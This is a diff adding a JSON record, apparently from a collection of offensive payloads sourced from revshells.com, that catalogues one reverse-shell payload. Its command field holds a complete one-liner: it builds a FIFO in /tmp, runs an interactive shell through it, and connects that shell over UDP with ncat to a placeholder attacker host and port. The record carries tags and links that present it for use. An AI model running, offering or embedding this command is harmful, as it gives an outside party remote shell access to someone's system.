@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-ncat-udp",
+  "name": "RSG · ReverseShell · ncat udp",
+  "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|ncat -u <lhost> <lport> >/tmp/f",
+  "description": "Reverse Shell payload — ncat udp (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/ncat udp/12",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
